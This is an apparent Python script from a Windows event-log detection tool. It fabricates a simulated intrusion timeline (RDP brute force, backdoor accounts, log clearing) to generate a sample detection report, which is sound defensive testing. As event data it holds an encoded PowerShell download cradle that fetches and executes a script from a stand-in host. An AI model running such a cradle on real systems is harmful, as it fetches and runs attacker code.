#!/usr/bin/env python3
"""Generate ``examples/sample_report.md`` from a simulated intrusion.

python-evtx can read but not write .evtx files, so this script builds the
events of a realistic attack timeline in memory and pushes them through the
exact same detection engine and report renderer the CLI uses.

Scenario (host WS01, all times UTC, IPs from documentation ranges):

    02:13  RDP password guessing against "administrator" from 203.0.113.47
    02:15  ...which succeeds; the attacker logs on with admin privileges
    02:17  Encoded PowerShell download cradle runs (stage-2 payload)
    02:21  Backdoor local account "svc_update" is created and used
    02:24  A second, hidden account "WS01-SYNC$" is created
    02:31  Security log is cleared

Mixed in is everyday noise that should *not* be reported: SYSTEM privileged
logons, a user mistyping their password twice, and a benign admin script.

Usage:
    python scripts/generate_sample_report.py [output.md]
"""

from __future__ import annotations

import base64
import sys
from datetime import datetime, timedelta, timezone
from itertools import count
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from eventhunter.engine import run_detectors  # noqa: E402
from eventhunter.models import Event  # noqa: E402
from eventhunter.report import render_markdown  # noqa: E402

HOST = "WS01.corp.local"
START = datetime(2026, 9, 14, 2, 0, 0, tzinfo=timezone.utc)
ATTACKER_IP = "203.0.113.47"
_records = count(184_201)


def ev(event_id: int, at: float, **data: str) -> Event:
    """Event ``at`` seconds after START."""
    return Event(
        event_id=event_id,
        timestamp=START + timedelta(seconds=at),
        record_id=next(_records),
        provider="Microsoft-Windows-Eventlog" if event_id == 1102 else "Microsoft-Windows-Security-Auditing",
        channel="Security",
        computer=HOST,
        data=data,
        source="WS01-Security.evtx",
    )


def encode(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def build_scenario() -> list[Event]:
    events: list[Event] = []
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

    # --- Background noise (should be filtered out) -------------------------------
    for minute in range(0, 40, 5):
        events.append(ev(4672, minute * 60, SubjectUserName="SYSTEM", SubjectDomainName="NT AUTHORITY",
                         SubjectUserSid="S-1-5-18", SubjectLogonId="0x3e7",
                         PrivilegeList="SeAssignPrimaryTokenPrivilege\n\t\tSeTcbPrivilege"))
    for t in (95, 101):  # jsmith fat-fingers a password twice - below threshold
        events.append(ev(4625, t, TargetUserName="jsmith", TargetDomainName="CORP", IpAddress="10.10.4.21",
                         LogonType="2", SubStatus="0xC000006A", WorkstationName="WS01"))
    events.append(ev(4688, 300, NewProcessName=ps, SubjectUserName="jsmith", SubjectDomainName="CORP",
                     CommandLine=f'"{ps}" -NoProfile -File C:\\IT\\map-drives.ps1',
                     ParentProcessName=r"C:\Windows\explorer.exe"))

    # --- 02:13 Brute force over RDP ------------------------------------------------
    t = 13 * 60
    for i in range(23):
        events.append(ev(4625, t + i * 4.1, TargetUserName="administrator", TargetDomainName="WS01",
                         IpAddress=ATTACKER_IP, WorkstationName="kali", LogonType="3",
                         SubStatus="0xC000006A", Status="0xC000006D"))

    # --- 02:15 ...the 24th guess works ----------------------------------------------
    t = 15 * 60 + 2
    events.append(ev(4624, t, TargetUserName="administrator", TargetDomainName="WS01",
                     IpAddress=ATTACKER_IP, LogonType="10", TargetLogonId="0x8a1f22"))
    events.append(ev(4672, t + 0.1, SubjectUserName="administrator", SubjectDomainName="WS01",
                     SubjectUserSid="S-1-5-21-3623811015-3361044348-30300820-500", SubjectLogonId="0x8a1f22",
                     PrivilegeList="SeSecurityPrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege\n\t\t"
                                   "SeTakeOwnershipPrivilege\n\t\tSeDebugPrivilege\n\t\tSeImpersonatePrivilege"))

    # --- 02:17 Encoded PowerShell download cradle ------------------------------------
    stage2 = ("$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');"
              "IEX $wc.DownloadString('http://198.51.100.23:8080/update.ps1')")
    events.append(ev(4688, 17 * 60 + 40, NewProcessName=ps, SubjectUserName="administrator",
                     SubjectDomainName="WS01", SubjectLogonId="0x8a1f22",
                     ParentProcessName=r"C:\Windows\System32\cmd.exe",
                     CommandLine=f"powershell.exe -nop -w hidden -noni -enc {encode(stage2)}"))

    # --- 02:21 Backdoor account, then used --------------------------------------------
    events.append(ev(4720, 21 * 60, TargetUserName="svc_update", TargetDomainName="WS01",
                     TargetSid="S-1-5-21-3623811015-3361044348-30300820-1009",
                     SubjectUserName="administrator", SubjectDomainName="WS01", SubjectLogonId="0x8a1f22"))
    events.append(ev(4672, 22 * 60 + 30, SubjectUserName="svc_update", SubjectDomainName="WS01",
                     SubjectUserSid="S-1-5-21-3623811015-3361044348-30300820-1009",
                     SubjectLogonId="0x8c3310", PrivilegeList="SeDebugPrivilege\n\t\tSeBackupPrivilege"))

    # --- 02:24 Second backdoor, disguised as a computer account ---------------------------
    events.append(ev(4720, 24 * 60 + 12, TargetUserName="WS01-SYNC$", TargetDomainName="WS01",
                     TargetSid="S-1-5-21-3623811015-3361044348-30300820-1010",
                     SubjectUserName="administrator", SubjectDomainName="WS01", SubjectLogonId="0x8a1f22"))

    # --- 02:31 Cover tracks ----------------------------------------------------------------
    events.append(ev(1102, 31 * 60 + 5, SubjectUserName="administrator", SubjectDomainName="WS01",
                     SubjectUserSid="S-1-5-21-3623811015-3361044348-30300820-500",
                     SubjectLogonId="0x8a1f22"))
    return events


def main() -> None:
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else ROOT / "examples" / "sample_report.md"
    events = build_scenario()
    detections = run_detectors(events)
    report = render_markdown(
        detections,
        events,
        sources=["WS01-Security.evtx"],
        generated_at=datetime(2026, 9, 14, 9, 30, 0, tzinfo=timezone.utc),  # fixed for reproducible output
    )
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(report, encoding="utf-8")
    print(f"wrote {out} ({len(detections)} detections from {len(events)} events)")


if __name__ == "__main__":
    main()
